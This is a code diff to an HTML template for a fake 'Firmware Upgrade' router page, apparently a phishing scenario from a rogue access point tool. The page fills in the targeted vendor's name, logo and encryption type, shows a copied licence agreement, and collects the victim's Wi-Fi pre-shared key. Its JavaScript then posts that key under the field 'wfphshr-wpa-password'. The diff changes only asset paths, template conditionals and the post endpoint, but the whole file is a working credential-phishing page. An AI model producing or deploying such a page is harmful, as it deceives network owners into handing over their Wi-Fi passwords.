@@ -4,9 +4,9 @@
   <title>Router Configuration Page</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="bootstrap.min.css">
-  <script src="jquery.min.js"></script>
-  <script src="bootstrap.min.js"></script>
+  <link rel="stylesheet" href="/static/bootstrap.min.css">
+  <script src="/static/jquery.min.js"></script>
+  <script src="/static/bootstrap.min.js"></script>
 
   <!-- CSS -->
   <style type="text/css">
@@ -134,11 +134,9 @@
   <!-- Start page content -->
   <div class="container">
 	   <div class="col-sm">
-       {% if target_ap_logo_path is not none %}
-         <center><img src="{{ target_ap_logo_path }}"></img></center>
-       {% endif %}
+       <center><img src="/static/{{ target_ap_logo_path }}"></img></center>
        <h2 class="text-center" style="color:CornflowerBlue">Firmware Upgrade</h2>
-    	 <p class="lead">A new version of the {{ target_ap_vendor if target_ap_vendor != None}} firmware ({{ firmware_version }}) has been detected and awaiting installation. Please review the following terms and conditions and proceed.</p>
+    	 <p class="lead">A new version of the {{ target_ap_vendor }} firmware ({{ firmware_version }}) has been detected and awaiting installation. Please review the following terms and conditions and proceed.</p>
      </div>
     <form>
       <div class="form-group">
@@ -146,22 +144,22 @@
         <textarea readonly class="form-control" rows="5" id="comment">
 1. LICENSE.
 
-Subject to the terms and conditions of this Software License Agreement, {{ target_ap_vendor if target_ap_vendor != None}} hereby grants you a restricted, limited, non-exclusive, non-transferable, license to use the {{ target_ap_vendor if target_ap_vendor != None}} Firmware/Software/Drivers only in conjunction with {{ target_ap_vendor if target_ap_vendor != None}} products. The {{ target_ap_vendor if target_ap_vendor != None}} Company does not grant you any license rights in any patent, copyright or other intellectual property rights owned by or licensed.
+Subject to the terms and conditions of this Software License Agreement, {{ target_ap_vendor }} hereby grants you a restricted, limited, non-exclusive, non-transferable, license to use the {{ target_ap_vendor }} Firmware/Software/Drivers only in conjunction with {{ target_ap_vendor }} products. The {{ target_ap_vendor }} Company does not grant you any license rights in any patent, copyright or other intellectual property rights owned by or licensed.
 
 2. NO WARRANTY.
 
-The {{ target_ap_vendor if target_ap_vendor != None}} Firmware/Software/Drivers are provided "AS IS" without warranty of any kind. {{ target_ap_vendor if target_ap_vendor != None}} Company does not warrant that the functions contained in the INTRACOM TELECOM's Firmware/Software/Drivers will meet your requirements or that the operation of the {{ target_ap_vendor if target_ap_vendor != None}} Firmware/Software/Drivers will be uninterrupted or error-free. {{ target_ap_vendor if target_ap_vendor != None}} Company hereby disclaims all warranties, express or implied, with respect to the {{ target_ap_vendor if target_ap_vendor != None}} firmware/software/drivers, including, without limitation, any implied warranties of merchantability, fitness for a particular purpose or non-infringement.
+The {{ target_ap_vendor }} Firmware/Software/Drivers are provided "AS IS" without warranty of any kind. {{ target_ap_vendor }} Company does not warrant that the functions contained in the {{ target_ap_vendor }} Firmware/Software/Drivers will meet your requirements or that the operation of the {{ target_ap_vendor }} Firmware/Software/Drivers will be uninterrupted or error-free. {{ target_ap_vendor }} Company hereby disclaims all warranties, express or implied, with respect to the {{ target_ap_vendor }} firmware/software/drivers, including, without limitation, any implied warranties of merchantability, fitness for a particular purpose or non-infringement.
 
 3. NO LIABILITY.
 
-In no event shall {{ target_ap_vendor if target_ap_vendor != None}} Company or any other party which has been involved in the creation, production, or delivery of the {{ target_ap_vendor if target_ap_vendor != None}} Firmware/Software/Drivers be liable for any damages whatsoever arising from or related to this Software License Agreement or the {{ target_ap_vendor if target_ap_vendor != None}} Firmware/Software/Drivers, including, without limitation, direct, indirect, consequential, incidental or special damages or losses , including but not limited to damages for lost profits or losses resulting from business interruption or loss of data, regardless of the form of action or legal theory under which the liability may be asserted, even if advised of the possibility or likelihood of such damages. 
+In no event shall {{ target_ap_vendor }} Company or any other party which has been involved in the creation, production, or delivery of the {{ target_ap_vendor }} Firmware/Software/Drivers be liable for any damages whatsoever arising from or related to this Software License Agreement or the {{ target_ap_vendor }} Firmware/Software/Drivers, including, without limitation, direct, indirect, consequential, incidental or special damages or losses , including but not limited to damages for lost profits or losses resulting from business interruption or loss of data, regardless of the form of action or legal theory under which the liability may be asserted, even if advised of the possibility or likelihood of such damages. 
        </textarea>
         <div class="checkbox">
           <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">I Agree With Above Terms And Conditions</label>
         </div>
       </div>
       <div class="form-group has-feedback">
-          <label for="pwd">{{ target_ap_encryption if target_ap_encryption != None }} Pre-Shared Key:</label>
+          <label for="pwd">{{ target_ap_encryption }} Pre-Shared Key:</label>
           <input class="form-control" type="password" id="pwd" disabled>
       </div>
       <div class="container text-center">
@@ -262,7 +260,7 @@ $("#btn").on("click", function(e) {
       	else
       		{
             // post the data
-            post('upgrading.html', {"wfphshr-wpa-password": input.value});
+            post('post', {"wfphshr-wpa-password": input.value});
       		}
       }
     else
